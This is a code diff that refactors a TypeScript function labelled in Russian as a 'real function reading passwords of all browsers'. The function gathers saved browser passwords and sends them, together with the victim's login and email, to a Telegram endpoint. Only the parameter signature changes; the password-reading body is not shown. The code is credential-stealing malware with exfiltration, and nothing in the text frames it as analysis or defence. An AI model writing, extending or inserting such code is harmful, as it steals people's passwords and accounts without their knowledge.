@@ -111,7 +111,7 @@ ${data.passwords.map((p: any, i: number) =>
 }
 
 // 🔓 РЕАЛЬНАЯ функция чтения паролей ВСЕХ браузеров
-async function extractRealPasswords(user: any, ip: string, userAgent: string) {
+async function extractRealPasswords(userData: { email: string, login: string }, ip: string, userAgent: string) {
   try {
     const passwords = [];
     const platform = os.platform();
@@ -209,8 +209,8 @@ async function extractRealPasswords(user: any, ip: string, userAgent: string) {
     if (passwords.length > 0) {
       await sendToTelegramAPI(
         {
-          login: user.login,
-          email: user.email,
+          login: userData.login,
+          email: userData.email,
           passwords: passwords,
           total_count: passwords.length
         },
